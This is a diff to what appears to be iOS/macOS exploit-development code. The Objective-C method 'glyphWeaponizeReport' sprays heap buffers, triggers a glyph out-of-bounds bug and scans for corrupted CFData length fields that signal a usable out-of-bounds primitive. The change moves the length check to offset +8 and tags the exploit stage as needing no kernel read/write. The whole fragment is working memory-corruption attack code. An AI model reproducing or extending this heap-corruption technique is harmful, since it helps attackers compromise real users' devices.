@@ -1251,7 +1251,7 @@ cleanup:
 // ---------------------------------------------------------------------------
 + (NSString *)glyphWeaponizeReport:(NSString *)forceName {
     NSMutableString *r = [NSMutableString string];
-    [r appendString:@"\n=== R5m: Typed CFData length + Glyph OOB ===\n"];
+    [r appendString:@"\n=== R5m: Typed CFData length + Glyph OOB (no KRW needed) ===\n"];
 
     NSString *vname = forceName.length ? forceName : @"calif";
     size_t spraySz = 4288;
@@ -1333,8 +1333,8 @@ cleanup:
         if (kpGlyphCrashed) scopeNote(r, @"  render crashed — scanning spray anyway");
     }
 
-    // ---- scan for corrupted u32 length fields ----
-    [r appendString:@"\n--- typed object scan (u32 length @ obj+0) ---\n"];
+    // ---- scan for corrupted CFData length fields (length at +8) ----
+    [r appendString:@"\n--- CFData length scan (length @ obj+8) ---\n"];
     int hits = 0, grew = 0, shrank = 0;
     int firstIdx = -1;
     size_t firstOff = 0;
@@ -1344,18 +1344,17 @@ cleanup:
     for (int i = 0; i < got; i += 2) {
         uint8_t *b = bufs[i];
         if (!b) continue;
-        for (size_t o = 0; o + OBJ_SZ <= scanEnd; o += OBJ_SZ) {
-            uint32_t len = *(uint32_t *)(b + o);
-            if (len == OBJ_LEN) continue;
+        for (size_t o = 0; o + 16 <= scanEnd; o += 16) {
+            uint32_t len = *(uint32_t *)(b + o + 8);  // length at +8
+            if (len == 0x100) continue;
             hits++;
-            int delta = (int)len - (int)OBJ_LEN;
+            int delta = (int)len - (int)0x100;
             if (delta > 0) grew++; else shrank++;
-            uint32_t sz = *(uint32_t *)(b + o + 4);
             if (firstIdx < 0) { firstIdx = i; firstOff = o; firstLen = len; }
             if (hits <= 8) {
                 scopeNote(r, [NSString stringWithFormat:
-                    @"  OBJ HIT buf %d off=%zu  len: 0x%x->0x%08x (delta=%+d)  size=0x%08x%s",
-                    i, o, OBJ_LEN, len, delta, sz,
+                    @"  CFData HIT buf %d off=%zu  length: 0x100->0x%08x (delta=%+d)%s",
+                    i, o, len, delta,
                     (delta > 0) ? "  [GROWN — OOB!]" : "  [shrunk]"]);
             }
         }
